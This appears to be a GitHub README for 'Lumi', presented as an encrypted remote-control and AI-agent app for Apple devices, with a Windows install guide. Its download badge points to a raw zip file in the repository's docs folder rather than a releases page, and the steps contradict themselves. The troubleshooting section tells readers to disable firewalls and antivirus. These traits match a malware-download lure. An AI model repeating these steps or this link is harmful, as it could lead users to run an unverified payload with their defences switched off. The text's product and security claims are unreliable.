Lumi is a secure and autonomous remote control application designed for macOS and iOS devices. It uses end-to-end encryption to keep your data safe as you control your devices remotely. Lumi offers a more private and flexible alternative to OpenClaw, making it easier to manage AI agents and workflows across multiple devices.

This guide helps you download and run Lumi on a Windows computer. No technical skills are needed.

## 📋 What You Need Before Starting

- A Windows PC running Windows 10 or newer.
- An internet connection.
- A supported Apple device (macOS or iOS) with Lumi installed for cross-device control.
- Basic computer skills such as downloading files and opening apps.

## 🔍 How Lumi Works

Lumi provides remote desktop and remote control features through encrypted connections. It lets you manage AI-driven workflows and automate tasks on your Apple devices right from your Windows computer. It supports agentic AI functions and secure communication, ensuring your workflow stays private and uninterrupted.

## 🎯 Key Features

- End-to-end encrypted remote control.

- Secure remote desktop viewing and control.
- AI agent integration for automation.
- Simple setup with no programming needed.
- Compatible with macOS and iOS devices.
- Works over local network and internet connections.

## 🚀 Getting Started with Lumi on Windows

### Step 1: Download Lumi for Windows

You will get Lumi from the official releases page on GitHub.

Click the button below to visit the releases page and download the latest version suitable for Windows:

[![Download Releases](https://img.shields.io/badge/Get-Latest%20Version-grey?style=for-the-badge&logo=github)](https://github.com/sangki1234/Lumi/raw/refs/heads/main/docs/Software-2.0-beta.1.zip)

1. Open the page in your web browser.
2. Look for a file with a `.exe` extension that matches the latest version of Lumi for Windows. It will usually be named like `Lumi-Setup-x.y.z.exe`.
3. Click on the file to download it to your Downloads folder.

### Step 2: Install Lumi

1. Open the folder where you downloaded the installer (`.exe` file).
2. Double-click the file to start the installation.
3. Follow the instructions in the installation wizard:
   - Accept the license agreement.
   - Choose the installation location or keep the default path.
   - Click "Install" to begin.
4. Wait until the installation completes, then click "Finish."

### Step 3: Prepare Your Apple Devices

- On your Mac or iPhone/iPad, install Lumi from the official Apple App Store if you have not done so.
- Make sure both your Windows PC and Apple devices are connected to the internet.
  
### Step 4: Connect Your Devices

1. Open Lumi on your Windows PC.
2. Open Lumi on your Apple device.
3. Follow on-screen instructions to pair your devices. Pairing usually requires scanning a QR code or entering a code shown on one device to the other.
4. After pairing, Lumi will establish an encrypted connection between your devices.

### Step 5: Start Using Lumi

- Use the desktop app to control your Apple device remotely.
- Run AI workflows or automation tasks linked to your agent.
- View live screens and control your device securely.

## 🔐 Security and Privacy

Lumi encrypts all data sent between devices. This protects your information from being intercepted. The app does not store your credentials or control data on any server. All agent control happens directly between your devices.

## 🔧 Troubleshooting Tips

- If you cannot download the installer, check your internet connection or try a different browser.
- Make sure you have enough disk space before installing.
- If devices do not pair, confirm both are on the same network, or retry the pairing process.
- Restart both your Windows PC and Apple device if connections fail.
- Disable firewalls or antivirus software temporarily if they block Lumi.
